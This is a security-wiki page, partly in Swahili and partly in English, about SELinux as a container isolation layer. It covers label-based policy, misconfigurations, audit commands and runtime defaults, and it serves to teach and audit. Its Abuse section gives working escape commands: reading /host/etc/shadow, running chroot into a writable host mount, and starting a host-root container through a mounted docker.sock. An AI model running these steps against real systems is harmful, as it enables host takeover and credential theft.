# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux ni mfumo wa **udhibiti wa lazima wa ufikiaji unaotegemea lebo**. Kila mchakato au kitu kinachohusiana kinaweza kubeba muktadha wa usalama, na sera huamua ni domain gani zinaweza kuingiliana na aina gani na kwa njia gani. Katika mazingira yaliyo containerized, hii kwa kawaida inamaanisha kwamba runtime inaanzisha mchakato la container chini ya domain iliyofungwa ya container na kupeleka lebo kwa yaliyomo ndani ya container kulingana na aina zao. Ikiwa sera inaenda vizuri, mchakato unaweza kusoma na kuandika vitu ambavyo lebo yake inatarajiwa kugusa huku ukikataliwa kupata yaliyomo mengine ya host, hata kama yaliyomo hayo yanapotokea yanavyoonekana kupitia mount.

Hii ni mojawapo ya kinga zenye nguvu upande wa host zinazopatikana katika deployments za kawaida za Linux container. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na mazingira mengine yanayoelekeza SELinux. Katika mazingira hayo, mpitia ambaye anapuuzia SELinux mara nyingi atakuwa na uelewa usio sahihi kwa nini njia ambayo inafanana wazi ya kuweza kuvunja usalama wa host imezuiliwa.

## AppArmor Vs SELinux

Tofauti rahisi ya kiwango cha juu ni kwamba AppArmor ni inayotegemea njia (path-based) wakati SELinux ni **label-based**. Hii ina matokeo makubwa kwa usalama wa container. Sera zinayotegemea njia zinaweza kutenda tofauti ikiwa yaliyomo yale yale ya host yanapojitokeza chini ya njia ya mount isiyotarajiwa. Sera inayotegemea lebo badala yake inauliza lebo ya kitu ni ipi na domain ya mchakato inaweza kufanya nini kwa kitu hicho. Hii haifanya SELinux kuwa rahisi, lakini inaiifanya iwe imara dhidi ya aina ya dhana za udanganyifu wa njia ambazo walinda mara nyingine hupata kwa bahati mbaya kwenye mifumo inayotegemea AppArmor.

Kwa kuwa modeli inaelekeza kwenye lebo, utunzaji wa volume za container na maamuzi ya kubadilisha lebo ni muhimu kwa usalama. Ikiwa runtime au operator watabadilisha lebo kwa upana kupita kiasi ili "make mounts work", mpaka wa sera uliotarajiwa kuwa unazuia mzigo wa kazi unaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.

## Lab

Ili kuona ikiwa SELinux imewezeshwa kwenye host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Ili kuchunguza lebo zilizopo kwenye mwenyeji:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Ili kulinganisha utekelezaji wa kawaida na ule ambapo uwekaji lebo umezimwa:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.

The recurring lesson is that SELinux is not an optional garnish. In the ecosystems that are built around it, it is part of the expected security boundary.

## Misconfigurations

The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.

It is also important not to confuse **installed** SELinux with **effective** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the workload under the expected domain. In those cases the protection is much weaker than the documentation might suggest.

## Abuse

When SELinux is absent, permissive, or broadly disabled for the workload, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with writable volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.

SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ikiwa host bind mount ipo na uwekaji lebo wa SELinux umezimwa au kudhoofishwa, ufichuzi wa taarifa mara nyingi hutokea kwanza:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ikiwa mount ni writable na container kwa ufanisi ni host-root kwa mtazamo wa kernel, hatua inayofuata ni kujaribu mabadiliko ya host yaliyodhibitiwa badala ya kubahatisha:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Kwenye mahosti zenye SELinux, kupoteza lebo karibu na saraka za hali ya runtime kunaweza pia kufichua njia za moja kwa moja za privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Amri hizi hazibadilishi full escape chain, lakini zinafanya iwe wazi haraka kama SELinux ndiyo ilikuwa ikizuia host data access au host-side file modification.

### Mfano Kamili: SELinux Disabled + Writable Host Mount

Ikiwa SELinux labeling imezimwa na host filesystem ime-mount writable kwenye `/host`, full host escape inakuwa kesi ya kawaida ya bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa `chroot` itafanikiwa, mchakato wa container sasa unafanya kazi kutoka kwenye filesystem ya host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Mfano Kamili: SELinux Imezimwa + Runtime Directory

Ikiwa workload inaweza kufikia runtime socket mara labels zitakapozimwa, escape inaweza kupelekwa kwa runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Uchunguzi muhimu ni kwamba SELinux mara nyingi ilikuwa udhibiti uliokuwa ukizuia hasa aina hii ya ufikiaji wa host-path au runtime-state.

## Ukaguzi

Lengo la ukaguzi wa SELinux ni kuthibitisha kwamba SELinux imewezeshwa, kutambua muktadha wa usalama wa sasa, na kuona kama faili au paths unazozijali kwa kweli zimetengwa kwa lebo.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` inapaswa kurejea `Enforcing`; `Permissive` au `Disabled` hubadilisha maana ya sehemu yote ya SELinux.
- Ikiwa muktadha wa mchakato wa sasa unaonekana usiotarajiwa au mpana sana, workload inaweza kuwa haifanyi kazi chini ya sera ya container iliyokusudiwa.
- Ikiwa faili zilizowekwa kwenye host au runtime directories zina lebo ambazo mchakato unaweza kuzifikia kwa urahisi sana, bind mounts zinakuwa hatari zaidi.

When reviewing a container on an SELinux-capable platform, do not treat labeling as a secondary detail. In many cases it is one of the main reasons the host is not already compromised.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Inategemea host | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Kwa kawaida imewezeshwa kwenye SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Kwa ujumla haijiwekwa moja kwa moja katika ngazi ya Pod | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Mara nyingi hutegemewa sana | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
{{#include ../../../../banners/hacktricks-training.md}}
